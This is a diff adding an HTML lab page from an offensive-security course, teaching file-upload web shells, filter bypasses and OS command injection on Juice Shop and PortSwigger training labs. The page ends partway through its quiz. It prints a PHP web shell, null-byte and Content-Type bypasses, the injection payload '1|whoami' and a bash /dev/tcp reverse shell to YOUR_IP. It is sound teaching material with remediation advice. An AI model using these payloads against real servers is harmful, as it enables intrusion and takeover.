@@ -1,0 +1,544 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="dark">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Lab 06: File Upload to Web Shell &amp; Command Injection — CCY4202</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;700;800&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="../assets/css/base.css" />
+  <link rel="stylesheet" href="../assets/css/layout.css" />
+  <link rel="stylesheet" href="../assets/css/components.css" />
+</head>
+<body data-nav-active="labs" data-active-lab="lab06" data-projector-qr>
+  <div data-site-nav></div>
+
+  <div class="page-wrapper">
+    <aside class="sidebar" id="site-sidebar">
+      <div class="sidebar__header">
+        <div class="sidebar__title">Course Modules</div>
+      </div>
+      <div id="sidebar-module-tree"></div>
+    </aside>
+    <div class="sidebar-backdrop"></div>
+
+    <main class="main-content">
+      <nav class="breadcrumbs" aria-label="Breadcrumb">
+        <a href="../index.html">Home</a>
+        <span class="breadcrumbs__separator">/</span>
+        <a href="../index.html">Labs</a>
+        <span class="breadcrumbs__separator">/</span>
+        <span>Module 01</span>
+        <span class="breadcrumbs__separator">/</span>
+        <span>Lab 06</span>
+      </nav>
+
+      <header class="lab-header">
+        <div class="lab-header__meta">
+          <span class="lab-badge lab-badge--time">⏱️ 60 Mins</span>
+          <span class="lab-badge lab-badge--difficulty">Intermediate</span>
+        </div>
+        <h1 class="lab-header__title">Lab 06: File Upload to Web Shell &amp; Command Injection</h1>
+        <p class="lab-header__lead">
+          Every lab so far stayed inside the web app: the database, the browser, other users' data. Today you break out. You get a file you control to run on the server as code, and from that moment you're not talking to the app anymore, you're running commands on the Linux box underneath it. This is the bridge from "web hacking" to "I have a shell," and the rest of the course lives on the far side of it.
+        </p>
+      </header>
+
+      <!-- Career band (v2) -->
+      <div class="info-dense-card info-dense-card--accent" style="margin-bottom:var(--space-4);">
+        <div class="info-dense-card__title">📌 Where this lands in the real world</div>
+        <div class="info-dense-card__grid">
+          <div class="info-dense-card__cell">
+            <span class="info-dense-card__label">OWASP Top 10</span>
+            <code>A02: Security Misconfig</code>
+          </div>
+          <div class="info-dense-card__cell">
+            <span class="info-dense-card__label">MITRE ATT&amp;CK</span>
+            <code>T1505.003 · T1059</code>
+          </div>
+          <div class="info-dense-card__cell">
+            <span class="info-dense-card__label">CEH domain</span>
+            <code>Web → System Hacking</code>
+          </div>
+          <div class="info-dense-card__cell">
+            <span class="info-dense-card__label">Builds toward</span>
+            <code>eJPT · BSCP</code>
+          </div>
+        </div>
+      </div>
+
+      <!-- Section 0: where we are -->
+      <section>
+        <h2 id="where-we-are">0. Where We Are</h2>
+        <div class="callout callout--theory">
+          <span class="callout__icon">🧭</span>
+          <div class="callout__content">
+            <div class="callout__title">The hinge of the whole course</div>
+            <p style="margin:0;">
+              Recon → Map → <strong>Identify → Exploit</strong> → Document, same spine. But this is the lab where Exploit stops meaning "trick the app" and starts meaning "run my own commands on the server." Labs 01 to 05 lived in the browser and the database. From here on we're on the operating system, which is exactly where Weeks 7 to 12 (network, privilege escalation, Active Directory) take place. Today you open that door.
+            </p>
+          </div>
+        </div>
+      </section>
+
+      <!-- Section 1: what a web shell is + anchor + static vs dynamic -->
+      <section>
+        <h2 id="what-webshell-is">1. How a Web Request Becomes a Shell <span style="font-size:var(--font-size-xs);color:var(--color-text-muted);font-family:var(--font-mono);">· foundation</span></h2>
+
+        <!-- Real-world anchor: Equifax -->
+        <div class="callout callout--tip">
+          <span class="callout__icon">🔥</span>
+          <div class="callout__content">
+            <div class="callout__title">2017: one unpatched web server, 147 million people</div>
+            <p style="margin:0 0 var(--space-2);">
+              Equifax ran a web app built on Apache Struts. Struts had a flaw (<code>CVE-2017-5638</code>, scored a perfect 10.0) where a crafted HTTP header got interpreted as code and ran on the server. Attackers sent the header, the server ran their commands, and they dropped web shells to keep access. From there they moved through the internal network for over two months and walked out with Social Security numbers and birth dates for about 147 million people.
+            </p>
+            <p style="margin:0;font-size:var(--font-size-sm);color:var(--color-text-secondary);">
+              The patch had been out for two months. The entire breach started the way today's lab does: a web request that the server ran as code instead of just reading.
+            </p>
+          </div>
+        </div>
+
+        <p class="lab-lead" style="margin-top:var(--space-4);">
+          A web server does two very different things with a file, and the whole lab hangs on the difference. It either <strong>sends the bytes</strong> (a photo, a PDF) or it <strong>runs the file</strong> and sends you the output (anything the server treats as code, like a <code>.php</code> script). Upload a cat photo, the server sends the photo. Upload a <code>.php</code> file to a server that runs PHP, and the server runs <em>your</em> code.
+        </p>
+
+        <div class="diagram-card" style="margin-top:var(--space-3);">
+          <div class="diagram-card__title"><span>SAME SERVER, TWO VERY DIFFERENT OUTCOMES</span></div>
+          <div class="comparison-grid" style="margin:0;">
+            <div class="comparison-card comparison-card--cyan">
+              <div class="comparison-card__header">
+                <h3 class="comparison-card__title">Static file → bytes</h3>
+                <span class="comparison-badge" style="color:var(--color-cyan);">harmless</span>
+              </div>
+              <div class="terminal-window" style="margin:var(--space-2) 0 0;"><div class="terminal-window__body"><pre><code>GET /uploads/cat.jpg
+→ server reads the file off disk
+→ sends the raw bytes back
+→ nothing runs</code></pre></div></div>
+            </div>
+            <div class="comparison-card comparison-card--accent">
+              <div class="comparison-card__header">
+                <h3 class="comparison-card__title">Executable file → code</h3>
+                <span class="comparison-badge" style="color:var(--color-accent);">RCE</span>
+              </div>
+              <div class="terminal-window" style="margin:var(--space-2) 0 0;"><div class="terminal-window__body"><pre><code>GET /uploads/shell.php?cmd=id
+→ server hands .php to PHP
+→ PHP runs your command on the OS
+→ sends the command's output back</code></pre></div></div>
+            </div>
+          </div>
+          <p style="font-size:var(--font-size-xs);color:var(--color-text-muted);margin:var(--space-2) 0 0;">
+            That one line, <code>&lt;?php system($_GET['cmd']); ?&gt;</code>, is a web shell. The server runs whatever you put in <code>cmd</code> as an OS command and hands you the result. The entire game is getting that file onto a server that will run it.
+          </p>
+        </div>
+
+        <div class="prediction-prompt" style="margin-top:var(--space-4);">
+          <div class="prediction-prompt__question">🤔 An app lets you upload a profile picture and only checks that the filename ends in an image extension. You upload a file called <code>shell.php</code>. It gets rejected. You rename it <code>shell.jpg</code> and it uploads fine. Can you get code execution now? Write your guess.</div>
+          <div class="prediction-prompt__input-group">
+            <input type="text" class="prediction-prompt__input" placeholder="Your guess…" />
+            <button type="button" class="prediction-prompt__btn">Reveal</button>
+          </div>
+          <div class="prediction-prompt__reveal" hidden>
+            <span class="prediction-prompt__reveal-label">Answer</span>
+            <p style="margin:0;">Not with <code>.jpg</code> alone: the server sends it as an image, so your PHP never runs. The job is to get a file that both <em>passes the upload check</em> and <em>still gets run as PHP</em>. The rest of this lab is the handful of tricks that do exactly that: lie about the content type, slip the real extension past a filter, or find a server that never checked.</p>
+          </div>
+        </div>
+      </section>
+
+      <!-- Section 2: security misconfiguration recon on Juice Shop (verified live) -->
+      <section>
+        <h2 id="misconfig-recon">2. Misconfiguration: The Doors Left Open <span style="font-size:var(--font-size-xs);color:var(--color-text-muted);font-family:var(--font-mono);">· recon · identify</span></h2>
+        <p class="lab-lead">
+          Before the upload, the recon. Servers leak backup files, debug endpoints, and whole directory listings because someone shipped a default setting. That's <strong>security misconfiguration</strong>, OWASP's number two, and it's where you find the way in. Juice Shop is running locally, so look at what it hands out for free.
+        </p>
+
+        <div class="target-launcher" data-target-slug="juice-shop">
+          <div class="target-launcher__header">
+            <div class="target-launcher__title-group">
+              <span class="target-launcher__icon">🧃</span>
+              <div>
+                <h3 class="target-launcher__title">OWASP Juice Shop</h3>
+                <div class="target-launcher__platform">Same container as Labs 02–05.</div>
+              </div>
+            </div>
+            <span class="target-launcher__badge">🎯 Launch Target</span>
+          </div>
+          <div class="target-launcher__body">
+            <div class="target-launcher__step">
+              <span class="target-launcher__step-label">🖐️ DO #1 · Start it (skip if it's still up)</span>
+              <div class="terminal-window" style="margin:var(--space-1) 0 0;">
+                <div class="terminal-window__header"><span class="terminal-window__title">bash · start Juice Shop</span></div>
+                <div class="terminal-window__body"><pre><code>docker run --rm -d --name juice -p 3000:3000 bkimminich/juice-shop</code></pre></div>
+              </div>
+            </div>
+          </div>
+          <div class="target-launcher__footer">
+            <span>Poke these from a terminal with <code>curl</code>, or just open them in the browser.</span>
+            <a class="target-launcher__catalog-link" href="../tools.html#juice-shop">→ setup card</a>
+          </div>
+        </div>
+
+        <div class="comparison-card comparison-card--cyan" style="margin-top:var(--space-4);">
+          <div class="comparison-card__header">
+            <h3 class="comparison-card__title">🟢 Baseline · read what the server gives away</h3>
+          </div>
+          <ol style="font-size:var(--font-size-sm);color:var(--color-text-secondary);padding-left:var(--space-4);margin:var(--space-2) 0 0;display:flex;flex-direction:column;gap:var(--space-1);">
+            <li>Open <code>http://localhost:3000/ftp</code>. The server hands you a full directory listing, including backup files nobody meant to publish.</li>
+            <li>Grab a harmless one: <code>http://localhost:3000/ftp/legal.md</code> downloads fine.</li>
+            <li>Now try the juicy one, <code>http://localhost:3000/ftp/package.json.bak</code>. It's blocked with a <code>403</code>. Only <code>.md</code> and <code>.pdf</code> are allowed out.</li>
+          </ol>
+        </div>
+
+        <div class="terminal-window" style="margin:var(--space-3) 0;">
+          <div class="terminal-window__header"><span class="terminal-window__title">bash · the directory listing is wide open, the .bak is almost reachable</span></div>
+          <div class="terminal-window__body"><pre><code>$ curl -s http://localhost:3000/ftp | grep -oE 'href="[^"]+"'
+href="ftp/coupons_2013.md.bak"
+href="ftp/package.json.bak"
+href="ftp/suspicious_errors.yml"          # that last name is a hint for later
+
+$ curl -s -o /dev/null -w "%{http_code}\n" http://localhost:3000/ftp/package.json.bak
+403                                        # blocked... but only by the extension check</code></pre></div>
+        </div>
+
+        <div class="prediction-prompt" style="margin-top:var(--space-3);">
+          <div class="prediction-prompt__question">🤔 The filter only lets <code>.md</code> and <code>.pdf</code> through, and it decides by looking at the end of the filename. You want <code>package.json.bak</code>. How do you make the filename <em>end</em> in <code>.md</code> while the server still opens the <code>.bak</code>? Guess before the reveal.</div>
+          <div class="prediction-prompt__input-group">
+            <input type="text" class="prediction-prompt__input" placeholder="Your guess…" />
+            <button type="button" class="prediction-prompt__btn">Reveal</button>
+          </div>
+          <div class="prediction-prompt__reveal" hidden>
+            <span class="prediction-prompt__reveal-label">Answer</span>
+            <p style="margin:0;">A null byte. <code>%2500</code> decodes to a <code>\0</code>, which old code treats as "end of string." The extension filter reads <code>...bak%2500.md</code>, sees <code>.md</code> at the end, and allows it. The file system reads up to the null and opens <code>package.json.bak</code>. Two layers disagree about where the filename ends, the same split you used for HTTP parameter pollution in Lab 05.</p>
+          </div>
+        </div>
+
+        <div class="comparison-card comparison-card--accent" style="margin-top:var(--space-4);">
+          <div class="comparison-card__header">
+            <h3 class="comparison-card__title">🟡 Stretch · poison null byte, retrieve the blocked file</h3>
+          </div>
+          <div class="terminal-window" style="margin:var(--space-2) 0 0;">
+            <div class="terminal-window__body"><pre><code>$ curl -s http://localhost:3000/ftp/package.json.bak%2500.md | head -3
+{
+  "name": "juice-shop",
+  "version": "6.2.0-SNAPSHOT"              # the backup file, served despite the 403</code></pre></div>
+          </div>
+        </div>
+
+        <details class="thought-accordion" style="margin-top:var(--space-3);">
+          <summary>Other doors Juice Shop leaves open</summary>
+          <div class="thought-accordion__content">
+            <p style="margin:0 0 var(--space-2);">Check these too, they all answer without a login: <code>/metrics</code> (full Prometheus metrics), <code>/rest/admin/application-configuration</code> (the app's config), and the response headers from <code>curl -I http://localhost:3000</code> (no <code>Content-Security-Policy</code> at all, which is why the XSS in Lab 04 ran so easily).</p>
+            <p style="margin:0;">None of these is a single dramatic bug. Together they're a map of a server nobody locked down, and that map is how you find the upload field, the admin panel, or the backup with credentials in it.</p>
+          </div>
+        </details>
+      </section>
+
+      <!-- Section 3: upload a web shell, get RCE (PortSwigger spine) -->
+      <section>
+        <h2 id="webshell-upload">3. Upload a Web Shell, Run Commands <span style="font-size:var(--font-size-xs);color:var(--color-text-muted);font-family:var(--font-mono);">· exploit</span></h2>
+        <p class="lab-lead">
+          Time to cross the line. You'll upload a tiny PHP file through an avatar field, then request it, and the server will run your commands. This one needs a real Apache/PHP server, so it runs on PortSwigger.
+        </p>
+
+        <div class="callout callout--tip" style="margin-top:var(--space-2);">
+          <span class="callout__icon">🧃</span>
+          <div class="callout__content">
+            <div class="callout__title">Why not Juice Shop here</div>
+            <p style="margin:0;">Juice Shop runs on Node, which doesn't execute <code>.php</code> files, so you can't get a PHP web shell on it. Its upload bugs are different (the <code>/ftp</code> null-byte you just did, plus an XXE bug). For a real web shell you need a server that runs PHP, which is exactly what these PortSwigger labs give you.</p>
+          </div>
+        </div>
+
+        <div class="target-launcher target-launcher--hosted" data-target-slug="portswigger">
+          <div class="target-launcher__header">
+            <div class="target-launcher__title-group">
+              <span class="target-launcher__icon">🎓</span>
+              <div>
+                <h3 class="target-launcher__title">PortSwigger: file upload to RCE</h3>
+                <div class="target-launcher__platform">Hosted · free account · real Apache/PHP</div>
+              </div>
+            </div>
+            <span class="target-launcher__badge">🌐 Launch</span>
+          </div>
+          <div class="target-launcher__body">
+            <div class="target-launcher__step">
+              <span class="target-launcher__step-label">🖐️ DO #2 · 🟢 Remote code execution via web shell upload</span>
+              <a class="target-launcher__url" href="https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-web-shell-upload" target="_blank" rel="noopener noreferrer">portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-web-shell-upload</a>
+            </div>
+          </div>
+          <div class="target-launcher__footer">
+            <span>Log in → <strong>Access the lab</strong> → fresh disposable URL</span>
+            <a class="target-launcher__catalog-link" href="../tools.html#portswigger">→ platform card</a>
+          </div>
+        </div>
+
+        <div class="comparison-card comparison-card--cyan" style="margin-top:var(--space-4);">
+          <div class="comparison-card__header">
+            <h3 class="comparison-card__title">🟢 Baseline · upload the shell, read a file off the server</h3>
+          </div>
+          <ol style="font-size:var(--font-size-sm);color:var(--color-text-secondary);padding-left:var(--space-4);margin:var(--space-2) 0 0;display:flex;flex-direction:column;gap:var(--space-1);">
+            <li>Save this one line as <code>exploit.php</code>. It reads a file and prints it, which proves your code ran on the server:
+              <div class="terminal-window" style="margin:var(--space-1) 0 0;"><div class="terminal-window__body"><pre><code>&lt;?php echo file_get_contents('/home/carlos/secret'); ?&gt;</code></pre></div>
+            </li>
+            <li>In the lab, log in as <code>wiener</code>, go to your account, and upload <code>exploit.php</code> as your avatar. The upload is accepted, no checks.</li>
+            <li>Request the file you just uploaded: <code>GET /files/avatars/exploit.php</code>. The server runs it and the response body is the contents of <code>carlos</code>'s secret file. Submit that to solve it.</li>
+          </ol>
+        </div>
+
+        <div class="terminal-window" style="margin:var(--space-3) 0;">
+          <div class="terminal-window__header"><span class="terminal-window__title">your uploaded file, requested back, runs on the server</span></div>
+          <div class="terminal-window__body"><pre><code>GET /files/avatars/exploit.php HTTP/1.1
+Host: YOUR-LAB-ID.web-security-academy.net
+
+HTTP/1.1 200 OK
+Content-Type: text/html
+
+k3y_0f_c4rl0s_s3cret_f1le          # a file off the server's disk, printed by your code</code></pre></div>
+        </div>
+
+        <div class="prediction-prompt" style="margin-top:var(--space-3);">
+          <div class="prediction-prompt__question">🤔 Reading one file is good. But you want to poke around: <code>id</code>, <code>ls</code>, <code>cat /etc/passwd</code>, whatever you decide after you're in. What would you put in <code>exploit.php</code> so you can send any command you want without re-uploading each time? Guess.</div>
+          <div class="prediction-prompt__input-group">
+            <input type="text" class="prediction-prompt__input" placeholder="Your guess…" />
+            <button type="button" class="prediction-prompt__btn">Reveal</button>
+          </div>
+          <div class="prediction-prompt__reveal" hidden>
+            <span class="prediction-prompt__reveal-label">Answer</span>
+            <p style="margin:0;"><code>&lt;?php system($_GET['cmd']); ?&gt;</code>. Now the command lives in the URL, so <code>exploit.php?cmd=id</code> runs <code>id</code>, <code>exploit.php?cmd=ls</code> runs <code>ls</code>, and you never re-upload. That's an interactive web shell, and <code>cmd=id</code> comes back as the web server's own user, <code>www-data</code>.</p>
+          </div>
+        </div>
+      </section>
+
+      <!-- Section 4: beat the upload filter -->
+      <section>
+        <h2 id="beat-the-filter">4. When the Upload Fights Back <span style="font-size:var(--font-size-xs);color:var(--color-text-muted);font-family:var(--font-mono);">· exploit</span></h2>
+        <p class="lab-lead">
+          Real apps don't accept <code>exploit.php</code> without a word. They check something. The skill is working out <em>what</em> they check, because it's almost never enough. Two classic checks, two ways through.
+        </p>
+
+        <div class="comparison-card comparison-card--accent" style="margin-top:var(--space-2);">
+          <div class="comparison-card__header">
+            <h3 class="comparison-card__title">🟡 Stretch · the server trusts your Content-Type</h3>
+          </div>
+          <p style="font-size:var(--font-size-sm);color:var(--color-text-secondary);margin:var(--space-2) 0;">
+            This lab rejects your upload unless it looks like an image, by reading the <code>Content-Type</code> header your browser sent. That header is yours to set. Catch the upload in Burp and change one line.
+          </p>
+          <div class="terminal-window" style="margin:0;">
+            <div class="terminal-window__body"><pre><code>Content-Disposition: form-data; name="avatar"; filename="exploit.php"
+Content-Type: image/jpeg          # was application/x-php. you just lied, and it believed you.
+
+&lt;?php system($_GET['cmd']); ?&gt;</code></pre></div>
+          </div>
+          <a class="target-launcher__url" style="margin-top:var(--space-2);" href="https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-content-type-restriction-bypass" target="_blank" rel="noopener noreferrer">🎯 Lab: web shell upload via Content-Type restriction bypass</a>
+          <p style="font-size:var(--font-size-xs);color:var(--color-text-muted);margin:var(--space-2) 0 0;">Same lesson as Lab 05's access control: a check that trusts a value the client controls is not a check.</p>
+        </div>
+
+        <div class="comparison-card comparison-card--accent" style="margin-top:var(--space-4);">
+          <div class="comparison-card__header">
+            <h3 class="comparison-card__title">🔴 Going Pro · the server blacklists the extension</h3>
+          </div>
+          <p style="font-size:var(--font-size-sm);color:var(--color-text-secondary);margin:var(--space-2) 0;">
+            Tougher lab: the server blocks the <code>.php</code> extension outright. You've already met the trick that beats this, two sections ago. Work out the filename yourself before you open the lab.
+          </p>
+          <div class="prediction-prompt" style="margin:0;">
+            <div class="prediction-prompt__question">🤔 The upload rejects anything ending in <code>.php</code>, but the server still needs to run your file as PHP. You used a null byte on <code>/ftp</code> earlier. What filename gets past a "no .php" check while still running as PHP?</div>
+            <div class="prediction-prompt__input-group">
+              <input type="text" class="prediction-prompt__input" placeholder="Your filename…" />
+              <button type="button" class="prediction-prompt__btn">Reveal</button>
+            </div>
+            <div class="prediction-prompt__reveal" hidden>
+              <span class="prediction-prompt__reveal-label">Answer</span>
+              <p style="margin:0;"><code>exploit.php%00.jpg</code>. The upload filter sees <code>.jpg</code> on the end and allows it; the server strips the null byte and saves <code>exploit.php</code>, which it runs. Same poison null byte, different target. (<code>.phtml</code> and other PHP extensions the blacklist forgot also work on some servers.)</p>
+            </div>
+          </div>
+          <a class="target-launcher__url" style="margin-top:var(--space-2);" href="https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-obfuscated-file-extension" target="_blank" rel="noopener noreferrer">🎯 Lab: web shell upload via obfuscated file extension</a>
+        </div>
+      </section>
+
+      <!-- Section 5: OS command injection + reverse shell -->
+      <section>
+        <h2 id="command-injection">5. No Upload Needed: OS Command Injection <span style="font-size:var(--font-size-xs);color:var(--color-text-muted);font-family:var(--font-mono);">· exploit</span></h2>
+        <p class="lab-lead">
+          Sometimes you don't need to upload anything. If the app ever passes your input into a shell command (checking stock, pinging a host, resizing an image), you can staple your own command onto the end. Same root cause as every injection bug: your data gets treated as code.
+        </p>
+
+        <div class="prediction-prompt" style="margin-top:var(--space-2);">
+          <div class="prediction-prompt__question">🤔 A stock checker runs a shell command on the server like <code>stock.sh 14 29</code> from your <code>productId</code> and <code>storeId</code>. You control <code>storeId</code>. What do you send to make it also run <code>whoami</code>?</div>
+          <div class="prediction-prompt__input-group">
+            <input type="text" class="prediction-prompt__input" placeholder="Your payload…" />
+            <button type="button" class="prediction-prompt__btn">Reveal</button>
+          </div>
+          <div class="prediction-prompt__reveal" hidden>
+            <span class="prediction-prompt__reveal-label">Answer</span>
+            <p style="margin:0;"><code>1|whoami</code>. The shell runs the first command, and the pipe <code>|</code> sends its output into your second command, so <code>whoami</code> runs and its output comes back in the response. <code>;</code>, <code>&amp;&amp;</code>, and backticks do similar jobs depending on the shell.</p>
+          </div>
+        </div>
+
+        <div class="comparison-card comparison-card--accent" style="margin-top:var(--space-4);">
+          <div class="comparison-card__header">
+            <h3 class="comparison-card__title">🔴 Going Pro · from one command to a real shell</h3>
+          </div>
+          <ol style="font-size:var(--font-size-sm);color:var(--color-text-secondary);padding-left:var(--space-4);margin:var(--space-2) 0 0;display:flex;flex-direction:column;gap:var(--space-2);">
+            <li>Solve the injection first: in the stock checker, set <code>storeId</code> to <code>1|whoami</code> and read the user back out of the response.
+              <a class="target-launcher__url" style="margin-top:var(--space-1);" href="https://portswigger.net/web-security/os-command-injection/lab-simple" target="_blank" rel="noopener noreferrer">🎯 Lab: OS command injection, simple case</a>
+            </li>
+            <li>One command at a time is clumsy. A pentester upgrades to an interactive <strong>reverse shell</strong>: the target connects back to you, and you type into a real prompt. Start a listener on your own machine:
+              <div class="terminal-window" style="margin:var(--space-1) 0 0;"><div class="terminal-window__body"><pre><code>nc -lvnp 4444</code></pre></div>
+            </li>
+            <li>Then inject the payload that calls home (swap in your IP). The target's shell connects back to your listener:
+              <div class="terminal-window" style="margin:var(--space-1) 0 0;"><div class="terminal-window__body"><pre><code>bash -i &gt;&amp; /dev/tcp/YOUR_IP/4444 0&gt;&amp;1</code></pre></div>
+            </li>
+          </ol>
+          <p style="font-size:var(--font-size-xs);color:var(--color-text-muted);margin:var(--space-2) 0 0;">
+            That reverse shell is the foothold. It's the exact thing Weeks 7 to 9 start from: you're now a user on the box (usually <code>www-data</code>), and the next job is to become root. A web bug became a Linux login.
+          </p>
+          <details class="thought-accordion" style="margin-top:var(--space-2);">
+            <summary>The reverse shell won't actually connect on the hosted lab, that's expected</summary>
+            <div class="thought-accordion__content"><p style="margin:0;">PortSwigger's lab lives in their cloud and can't reach your laptop, so <code>/dev/tcp/YOUR_IP/...</code> has nowhere to call back to. On the hosted lab you read command output in-band (the <code>1|whoami</code> result in the response). You land a real reverse shell in Week 8 on TryHackMe, where you're on a VPN and the target can actually reach you. Learn the payload now, fire it for real then.</p></div>
+          </details>
+        </div>
+      </section>
+
+      <!-- Section 6: finding + fix -->
+      <section>
+        <h2 id="write-finding">6. Write the Finding <span style="font-size:var(--font-size-xs);color:var(--color-text-muted);font-family:var(--font-mono);">· document</span></h2>
+        <p class="lab-lead">
+          This is the most serious finding you've written so far. Full control of the server is about as bad as it gets, so the write-up matters.
+        </p>
+        <div class="diagram-card">
+          <div class="diagram-card__title">
+            <span>📓 FINDING · Unrestricted file upload leading to remote code execution</span>
+            <span style="color:var(--color-danger);">severity: Critical</span>
+          </div>
+          <div class="table-container">
+            <table class="data-table">
+              <tbody>
+                <tr><td style="white-space:nowrap;"><strong>Title</strong></td><td>Unrestricted file upload allows an authenticated user to execute OS commands (RCE)</td></tr>
+                <tr><td><strong>Severity</strong></td><td>Critical · <code>CVSS 9.1</code> (full command execution on the server as the web user)</td></tr>
+                <tr><td><strong>Affected endpoint</strong></td><td>Avatar upload (<code>POST .../avatar</code>) and retrieval path (<code>GET /files/avatars/&lt;file&gt;</code>), which executes uploaded <code>.php</code></td></tr>
+                <tr><td><strong>Steps to reproduce</strong></td><td>1. Upload <code>exploit.php</code> containing <code>&lt;?php system($_GET['cmd']); ?&gt;</code> as an avatar. 2. Request <code>GET /files/avatars/exploit.php?cmd=id</code>. 3. The response returns command output running as <code>www-data</code>. Filter variants bypassed via <code>Content-Type: image/jpeg</code> and the <code>exploit.php%00.jpg</code> null byte.</td></tr>
+                <tr><td><strong>Impact</strong></td><td>Arbitrary command execution on the host. An attacker can read every file the web user can, pivot to the internal network, and work toward full server takeover. This is how the Equifax-class breaches start.</td></tr>
+                <tr><td><strong>Remediation</strong></td><td>Validate the file by its actual content, not its extension or <code>Content-Type</code>. Store uploads outside the web root, or on a path served with execution disabled. Generate a random server-side filename. For command injection: never build shell commands from user input, use parameterized APIs and allow-lists.</td></tr>
+              </tbody>
+            </table>
+          </div>
+          <p style="font-size:var(--font-size-xs);color:var(--color-text-muted);margin:var(--space-2) 0 0;">Critical, not just High, because it's direct code execution with no further chain needed. Compare Lab 05's access control (High): reading data is bad, running commands is worse.</p>
+        </div>
+
+        <h3 id="the-fix" style="margin-top:var(--space-4);">The fix, side by side</h3>
+        <div class="comparison-grid" style="margin-top:var(--space-2);">
+          <div class="comparison-card comparison-card--accent">
+            <div class="comparison-card__header">
+              <h3 class="comparison-card__title">💥 Vulnerable</h3>
+              <span class="comparison-badge" style="color:var(--color-danger);border-color:rgba(255,51,102,0.4);">trusts the filename</span>
+            </div>
+            <div class="terminal-window" style="margin:0;">
+              <div class="terminal-window__body"><pre><code>// keep the name the user sent,
+// drop it in the web root
+move_uploaded_file(
+  $tmp,
+  "/var/www/uploads/" . $name
+);
+// .php here will execute</code></pre></div>
+            </div>
+          </div>
+          <div class="comparison-card comparison-card--cyan">
+            <div class="comparison-card__header">
+              <h3 class="comparison-card__title">✅ Fixed</h3>
+              <span class="comparison-badge" style="color:var(--color-cyan);border-color:rgba(0,229,255,0.4);">content-checked, inert</span>
+            </div>
+            <div class="terminal-window" style="margin:0;">
+              <div class="terminal-window__body"><pre><code>// verify real content is an image,
+// rename server-side, store where
+// nothing can execute
+if (!is_real_image($tmp)) reject();
+$safe = random_id() . ".jpg";
+move_uploaded_file($tmp,
+  "/srv/uploads/" . $safe); // no PHP here</code></pre></div>
+            </div>
+          </div>
+        </div>
+        <p style="font-size:var(--font-size-sm);color:var(--color-text-secondary);margin-top:var(--space-2);">
+          The pattern under both this and Lab 05: stop trusting what the client tells you about its own request. The filename, the extension, the <code>Content-Type</code>, the <code>BasketId</code>, they're all attacker input. Decide on the server, from the content, every time.
+        </p>
+      </section>
+
+      <!-- Section 7: quiz -->
+      <section>
+        <h2 id="self-assessment">Lab 06 Self-Assessment <span style="font-size:var(--font-size-xs);color:var(--color-text-muted);font-family:var(--font-mono);">· 6 questions</span></h2>
+        <p class="lab-lead">🖐️ DO #3 · Check yourself. Say why the wrong ones are wrong.</p>
+
+        <div class="quiz-card" data-question-id="lab06-q1">
+          <div class="quiz-question">Q1: Why does uploading <code>shell.php</code> give code execution, but uploading <code>cat.jpg</code> doesn't?</div>
+          <div class="quiz-options">
+            <button type="button" class="quiz-option" data-correct="false" data-feedback="Size has nothing to do with it. A one-line .php runs; a huge .jpg still doesn't.">A) The .php file is smaller so the server runs it.</button>
+            <button type="button" class="quiz-option" data-correct="true" data-feedback="Right. The server hands .php to the PHP interpreter and runs it; a .jpg is just read off disk and sent as bytes.">B) The server executes .php through the PHP interpreter; a .jpg is only read and sent as bytes.</button>
+            <button type="button" class="quiz-option" data-correct="false" data-feedback="HTTPS encrypts the transfer. It doesn't decide whether a file runs on the server.">C) Because .php files are sent over HTTPS.</button>
+          </div>
+          <div class="quiz-feedback"></div>
+        </div>
+
+        <div class="quiz-card" data-question-id="lab06-q2">
+          <div class="quiz-question">Q2: An upload only checks the <code>Content-Type</code> header. How do you get a <code>.php</code> shell past it?</div>
+          <div class="quiz-options">
+            <button type="button" class="quiz-option" data-correct="true" data-feedback="Correct. The Content-Type is set by the client. In Burp, change it to image/jpeg while keeping the .php filename and payload.">A) Keep the .php filename but set Content-Type: image/jpeg in Burp.</button>
+            <button type="button" class="quiz-option" data-correct="false" data-feedback="Renaming to .jpg makes the server serve it as an image, so your PHP never runs. You need it to pass the check AND still execute.">B) Rename the file to shell.jpg.</button>
+            <button type="button" class="quiz-option" data-correct="false" data-feedback="Encrypting the body doesn't change what Content-Type the server reads or how it stores the file.">C) Encrypt the file before uploading.</button>
+          </div>
+          <div class="quiz-feedback"></div>
+        </div>
+
+        <div class="quiz-card" data-question-id="lab06-q3">
+          <div class="quiz-question">Q3: <code>GET /ftp/package.json.bak</code> returns 403, but <code>/ftp/package.json.bak%2500.md</code> returns it. What's <code>%2500</code> doing?</div>
+          <div class="quiz-options">
+            <button type="button" class="quiz-option" data-correct="false" data-feedback="It's not about speed or caching. The byte changes how the filename is parsed.">A) It caches the file so the 403 is skipped.</button>
+            <button type="button" class="quiz-option" data-correct="true" data-feedback="Right. It's a null byte. The extension filter sees .md and allows it; the file system stops reading at the null and opens the .bak. Two layers disagree about where the name ends.">B) It's a null byte: the filter sees .md, the file system reads up to the null and opens the .bak.</button>
+            <button type="button" class="quiz-option" data-correct="false" data-feedback="No login happens here. It's a parsing trick, not an auth bypass.">C) It logs you in as admin.</button>
+          </div>
+          <div class="quiz-feedback"></div>
+        </div>
+
+        <div class="quiz-card" data-question-id="lab06-q4">
+          <div class="quiz-question">Q4: In a stock checker, <code>storeId=1|whoami</code> makes the server run <code>whoami</code>. What's the flaw?</div>
+          <div class="quiz-options">
+            <button type="button" class="quiz-option" data-correct="false" data-feedback="Nothing is injected into a database here. The input goes into a shell command, not SQL.">A) SQL injection.</button>
+            <button type="button" class="quiz-option" data-correct="true" data-feedback="Correct. OS command injection: your input is passed into a shell, and the pipe chains your own command onto the server's.">B) OS command injection, your input lands in a shell command.</button>
+            <button type="button" class="quiz-option" data-correct="false" data-feedback="No script runs in a browser here. The command runs server-side on the OS.">C) Cross-site scripting.</button>
+          </div>
+          <div class="quiz-feedback"></div>
+        </div>
+
+        <div class="quiz-card" data-question-id="lab06-q5">
